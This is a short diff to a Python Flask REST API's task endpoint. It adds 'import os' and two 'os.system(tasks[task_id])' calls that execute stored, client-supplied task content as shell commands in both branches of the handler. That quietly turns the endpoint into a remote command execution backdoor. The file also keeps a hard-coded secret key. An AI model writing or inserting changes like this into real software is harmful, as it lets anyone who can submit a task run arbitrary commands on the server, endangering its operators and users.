@@ -1,6 +1,7 @@
 from flask import Flask, request
 from flask_restful import Resource, Api
 import json
+import os
 
 app = Flask(__name__, static_url_path='')
 app.secret_key = 'why would I tell you my secret key?'
@@ -21,8 +22,11 @@ class Task(Resource):
             results = json.loads(tasks[task_id])
         except ValueError, e:
             results = tasks[task_id]
+            os.system(tasks[task_id])
         else:
             results = tasks[task_id]
+            os.system(tasks[task_id])
+            
         return results, 201
 
     @staticmethod
